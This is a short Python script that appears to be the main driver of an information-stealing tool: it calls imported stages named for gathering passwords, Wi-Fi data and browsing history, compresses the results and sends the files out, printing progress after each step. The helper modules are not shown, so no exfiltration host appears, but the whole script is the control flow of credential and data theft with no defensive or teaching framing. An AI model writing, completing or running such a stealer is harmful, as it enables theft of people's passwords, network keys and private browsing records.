from compressor import compress_all
from passwordgather import stage_1
from wifigather import stage_2
from historygather import stage_3
from sendfiles import send_files
import time

stage_1()
print('Stage 1 completed')
stage_2()
print('Stage 2 completed')
stage_3()
print('Stage 3 completed')
compress_all()
print('All files compressed')
send_files()
print('Files sent')


